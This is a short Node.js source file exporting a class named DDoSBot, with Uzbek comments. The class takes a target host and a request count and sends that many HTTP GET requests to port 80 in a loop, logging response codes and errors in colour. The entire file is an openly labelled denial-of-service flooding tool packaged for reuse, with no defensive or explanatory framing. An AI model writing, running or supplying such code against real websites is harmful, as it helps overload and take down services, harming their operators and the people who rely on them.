const http = require('http');
const request = require('request');

class DDoSBot {
    constructor(targetUrl, limitRequest) {
        this.targetUrl = targetUrl;
        this.limitRequest = limitRequest;
    }

    httpDdos() {
        for (let i = 0; i < this.limitRequest; i++) {
            this.sendHttpRequest();
        }
    }

    sendHttpRequest() {
        const options = {
            hostname: this.targetUrl,
            port: 80,
            path: '/',
            method: 'GET'
        };

        const req = http.request(options, (res) => {
            console.log('\x1b[32m', `HTTP Javob status codi: ${res.statusCode}`); // Matnni yashil rangda ko'rsatish
        });

        req.on('error', (e) => {
            console.error('\x1b[31m', `HTTP o'rov Xatolik: ${e.message}`); // Matnni qizil rangda ko'rsatish
        });

        req.end();
    }




}

module.exports = DDoSBot;
